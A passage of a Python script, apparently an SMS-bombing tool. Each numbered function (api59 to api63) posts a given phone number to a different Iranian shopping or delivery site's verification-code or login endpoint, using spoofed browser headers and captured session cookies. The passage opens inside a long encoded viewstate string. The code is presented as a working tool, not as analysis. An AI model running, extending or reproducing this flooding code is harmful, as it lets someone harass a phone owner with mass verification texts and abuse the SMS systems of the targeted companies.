dyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSczMDI5Mic+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMwMjkyJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Yutiw2KfbjCDYrduM2YjYp9mG2KfYqjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nNDUyOTMnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX40NTI5MycgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2YjYs9in24zZhCDYotmF2YjYsti024wg2K3bjNmI2KfZhtin2Ko8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzQ1Mjk0Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+NDUyOTQnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtmE2YjYp9iy2YUg2KzYp9mG2KjbjCDYrduM2YjYp9mG2KfYqjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzIyNDcnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4zMjI0NycgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYrNmH24zYstin2Kog2KLaqdmI2KfYsduM2YjZhSA8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PC91bD48L2xpPjxsaSBjbGFzcz0nZGVza3RvcG1lbnUtbDEtaXRlbSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjc3OTk1JyAgPtin2LHYsiDZiCDYt9mE2Kc8L2E+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgZmlsbD0iY3VycmVudENvbG9y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2obZhyDar9mI2LTbjOKAjNmH2KfbjNuMINin2YbYr9ix2YjbjNivIDEyINix2Kcg2K/YsduM2KfZgdiqINmF24zigIzaqdmG2YbYr9ifICjZhNuM2LPYqiDYrC4uLh8BBQ0vVGV4dC8zNDczNTEvHwYF+gnar9mI2q/ZhNiMINin2YbYr9ix2YjbjNivINux27Ig2LHYpyDZhtuM2YXZhyDYr9mI2YUg2LPYp9mEINuy27DbstuxINmF2YbYqti02LEg2qnYsdivINmIINio2LHZhtiv2YfYp9uMINmF2K7YqtmE2YEg2KrZhNmB2YYg2YfZhdix2KfZhyDZh9mFINin2LIg2KLZhiDYstmF2KfZhiDYqtin2qnZhtmI2YYg2K/YsSDYrdin2YQg2LfYsdin2K3bjCDYsdin2KjYtyDaqdin2LHYqNix24wg2LPYp9iy2q/Yp9ixINio2Kcg2LPbjNiz2KrZhSDYudin2YXZhCDYrNiv24zYryDZh9iz2KrZhtivLiDar9mI2LTbjCZ6d25qO9mH2KfbjNuMINqp2Ycg2KfZhtiv2LHZiNuM2K8g27HbsiDYsdinINiv2LHbjNin2YHYqiDZhduMJnp3bmo72qnZhtmG2K/YjCDZhdi52YXZiNmE2Kcg2YXYr9mEJnp3bmo72YfYp9uMINis2K/bjNiv2KrYsSDYqNix2YbYr9mH2Kcg2YfYs9iq2YbYry4g2qnZhdm+2KfZhtuMJnp3bmo72YfYpyDYp9mG2K/YsdmI24zYryDbsduyINix2Kcg2KjYsdin24wg2q/ZiNi024wmenduajvZh9in24zbjCDaqdmHINiv2LEg2LPYp9mEJnp3bmo72YfYp9uMINuy27Dbsdu5INmIINmC2KjZhCDYp9iyINii2YYg2KrZiNmE24zYryDYtNiv2YcmenduajvYp9mG2K/YjCDYp9ix2KfYptmHINmG2YXbjCZ6d25qO9iv2YfZhtivLiDar9mI2LTbjCZ6d25qO9mH2KfbjNuMINqp2Ycg2K/YsSDYs9in2YQg27LbsNuy27Ig2KrZiNmE24zYryDZiCDYsdmI2KfZhtmHINio2KfYstin2LEg2YXbjCZ6d25qO9i02YjZhtiv2Iwg2KfYsiDYs9uM2LPYqtmFINi52KfZhdmEINin2YbYr9ix2YjbjNivINux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stin2LEg2LnYsdi22Ycg2qnYsdiv2Ycg2Ygg2YXYrdio2YjYqNuM2Kog2LLbjNin2K/bjCDYqNmHINiv2LPYqiDYotmI2LHYr9mHINin2LPYqi4g2YLYp9io2YTbjNiqJnp3bmo72YfYp9uM24wg2YXYq9mEINmG2LHYriDYqtin2LLZhyZ6d25qO9iz2KfYstuMINux27LbsCDZh9ix2KrYstuMINuM2KcgNUcg2YjbjNqY2q/bjCZ6d25qO9mH2KfbjCDar9mI2LTbjCZ6d25qO9mH2KfbjCDYqNin2YTYp9ix2K/ZhyDZh9iz2KrZhtivINmIINqp2YXYqtixINmF24zYp9mGJnp3bmo72LHYr9mHJnp3bmo72KfbjCDYp9uM2YYg2YLYp9io2YTbjNiqJnp3bmo72YfYpyDYsdinINiv2KfYsdivLiDYqNmHINmH2YXbjNmGINiv2YTbjNmEINqp2YXZvtin2YbbjCDZvtmI2qnZiCDYqtmI2KfZhtiz2Kog2KjYpyDYp9ix2KfYptmHINin24zZhiDZiNuM2pjar9uMJnp3bmo72YfYpyDYr9ixINqv2YjYtNuMJnp3bmo72YfYp9uMINmC24zZhdiqINmF2YbYp9iz2Kgg2K7ZiNiv2Iwg2YHYsdmI2LQg2K7ZiNio24wg2K/Yp9i02KrZhyDYqNin2LTYry4g2KjYudivINin2LIg2YXZiNmB2YLbjNiqINin24zZhiDYr9mIINmF24zYp9mGJnp3bmo72LHYr9mH2Iwg2LTbjNin2KbZiNmF24wg2YbYs9iu2YcmenduajvZh9in24wg2b7YsdmIINmH2LEg2K/ZiCDYsdinINmG24zYsiDYudix2LbZhyDaqdix2K8g2Ygg2YLYp9io2YTbjNiqJnp3bmo72YfYp9uMINii2YYmenduajvZh9inINix2Kcg2KjbjNi0Jnp3bmo72KfYstm+24zYtCDYp9ix2KrZgtinINiv2KfYry4gICAgICZuYnNwOyAgICAg2KfbjNmGINmF2YLYp9mE2Ycg2K/Ysdio2KfYsdmHINmF2YLYp9uM2LPZhyDar9mI2LTbjCDYtNuM2KfYptmI2YXbjCDZvtmI2qnZiCBYMyDYqNinINm+2YjaqdmIIE0zINmG2YjYtNiq2Ycg2LTYr9mHINin2LPYqi4g2YLYtdivINiv2KfYsduM2YUg2K/YsSDYp9uM2YYg2YXYt9mE2Kgg2YjbjNqY2q/bjCZ6d25qO9mH2KfbjCDZhdiu2KrZhNmBINmH2LEg2K/ZiCDar9mI2LTbjCDYsdinINio2LHYsdiz24wg2qnZhtuM2YUg2Ygg2K/YsdmG2YfYp9uM2Kog2KjZhyDYp9uM2YYg2YbYqtuM2KzZhyDYqNix2LPbjNmFINqp2Ycg2qnYr9in2YUg24zaqSDYqNuM2LTYqtixINin2LHYsti0INiu2LHbjNiv2YYg2K/Yp9ix2YbYry4gICAgICZuYnNwO2RkAiYPDxYCHwEFDS9TaG9wUmVxdWVzdC9kZAIoDw8WAh8BBQwvVGV4dC8yNDcwNy9kZAIqDw8WAh8BBQkv2KrZhdin2LNkZAIsDw8WAh8CBS1Db3B5cmlnaHQgwqkgMjAxMi0yMDIyIC0gQWxsIHJpZ2h0cyByZXNlcnZlZC5kZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUTY3RsMDAkY2hrUmVtZW1iZXJNZTcU946KRzZYrpCWXoWx9otZ2hqv',
        '__VIEWSTATEGENERATOR': '472152BE',
        '__EVENTVALIDATION': '/wEdAAoknxQLNCnBSWEuf7e7feiPYdC5RH0+Pebqvb9IRXZcdtpKD5xPQMj7lK+oQAhXvIUvz0gL8cmyBu9Bou5TEqNhUGacid2UxzVoJ0+OeUIlwkkWVVLTtWhMf1FTZvy9og1VekZAH7n66iWui6apxhYL4+3WpZQNb82rzs2KnT3rhyURVo8pMidQIn4Id0cjD7lmxw3ZWNoVnXD0jLylDU9UnjpszG/8i6CENW9tjqsQDHytZs4=',
        'ctl00$hfildisuser': '0',
        'ctl00$txtemailmobile': '',
        'ctl00$txtPassword': '',
        'ctl00$chkRememberMe': 'on',
        'ctl00$txtSearch': '',
        'ctl00$ContentPlaceHolder1$txtemailmobile': number,
        'ctl00$ContentPlaceHolder1$butok2': '\u062A\u0627\u06CC\u06CC\u062F',
    }

    response = requests.post('https://emalls.ir/registernew.aspx', headers=headers, params=params, cookies=cookies,
                             data=data)


def api59(number):
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'platform': 'desktop',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.banimode.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.banimode.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://mobapi.banimode.com/api/v2/auth/request', headers=headers, json=json_data)


def api60(number):
    headers = {
        'authority': 'api.snapp.market',
        # 'content-length': '0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://m.snapp.market',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://m.snapp.market/',
        'accept-language': 'en-US,en;q=0.9',
    }

    params = {
        'cellphone': number,
    }

    response = requests.post('https://api.snapp.market/mart/v1/user/loginMobileWithNoPass', headers=headers,
                             params=params)


def api61(number):
    cookies = {
        'abtest': 'next',
        'search_session': 'lxjljixmlvpxvejkhbqvehqvpvmovwst',
        '_gcl_au': '1.1.1201096203.1648804766',
        '_gid': 'GA1.2.1791983564.1648804767',
        '_gat_UA-105982196-1': '1',
        '_ga_CF4KGKM3PG': 'GS1.1.1648804765.1.0.1648804765.0',
        '_ga': 'GA1.1.1622383036.1648804767',
        '_clck': 'vqvciq|1|f09|0',
        '_clsk': '1geoh1t|1648804768135|1|0|j.clarity.ms/collect',
    }

    headers = {
        'authority': 'api.torob.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://torob.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://torob.com/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'abtest=next; search_session=lxjljixmlvpxvejkhbqvehqvpvmovwst; _gcl_au=1.1.1201096203.1648804766; _gid=GA1.2.1791983564.1648804767; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1648804765.1.0.1648804765.0; _ga=GA1.1.1622383036.1648804767; _clck=vqvciq|1|f09|0; _clsk=1geoh1t|1648804768135|1|0|j.clarity.ms/collect',
    }

    params = {
        'phone_number': number,
    }

    response = requests.get('https://api.torob.com/v4/user/phone/send-pin/', headers=headers, params=params,
                            cookies=cookies)


def api62(number):
    cookies = {
        'advanced-api': '7e218376525672e90534ffc336a6092c',
        '_hjSessionUser_2796837': 'eyJpZCI6ImNhZjllOTY5LWQyNmMtNWE5NC05MDFlLTMyY2U2YTQwZTE4MSIsImNyZWF0ZWQiOjE2NDg4MDUwOTA3MTAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample': '0',
        '_hjSession_2796837': 'eyJpZCI6IjU5YzkxMWVjLTMzNzMtNDgyMi04NjkwLWU4NWYzOGM1ZjM0ZiIsImNyZWF0ZWQiOjE2NDg4MDUwOTA3MTksImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '_ga': 'GA1.2.440272173.1648805102',
        '_gid': 'GA1.2.2073769288.1648805102',
        '_gat': '1',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'a0b92e6c-43c6-02e6-2418-d576d8523ee5',
        'analytics_session_token': '01b115f1-d84e-ac23-0f65-f9bf832a66bb',
        'yektanet_session_last_activity': '4/1/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'login-callback': '%2F',
    }

    headers = {
        'authority': 'www.mobit.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'vue': '1',
        'sec-ch-ua-mobile': '?0',
        'mbt-url': 'httpswww.mobit.ir/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json',
        'device': '1',
        'client-id': 'mobit_web',
        'os': '3',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://www.mobit.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.mobit.ir/auth',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'advanced-api=7e218376525672e90534ffc336a6092c; _hjSessionUser_2796837=eyJpZCI6ImNhZjllOTY5LWQyNmMtNWE5NC05MDFlLTMyY2U2YTQwZTE4MSIsImNyZWF0ZWQiOjE2NDg4MDUwOTA3MTAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2796837=eyJpZCI6IjU5YzkxMWVjLTMzNzMtNDgyMi04NjkwLWU4NWYzOGM1ZjM0ZiIsImNyZWF0ZWQiOjE2NDg4MDUwOTA3MTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga=GA1.2.440272173.1648805102; _gid=GA1.2.2073769288.1648805102; _gat=1; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=a0b92e6c-43c6-02e6-2418-d576d8523ee5; analytics_session_token=01b115f1-d84e-ac23-0f65-f9bf832a66bb; yektanet_session_last_activity=4/1/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; login-callback=%2F',
    }

    json_data = {
        'number': number,
    }

    response = requests.post('https://www.mobit.ir/api/web/v6/register/login', headers=headers, cookies=cookies,
                             json=json_data)


def api63(number):
    cookies = {
        'OCSESSID': '96c2e24bb5079041a51e97f39d',
        'language': 'fa-ir',
        'currency': 'TOM',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'eac0e8c1-cedc-5676-8db8-8955ccc721ef',
        'analytics_session_token': 'b60f38f6-affc-481f-6347-44376b0fe427',
        'yektanet_session_last_activity': '4/1/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_ga': 'GA1.2.2006950490.1648805433',
        '_gid': 'GA1.2.211667374.1648805433',
        '_gat_gtag_UA_111640810_1': '1',
        '_5ea4432cb01019433b7d5212': 'true',
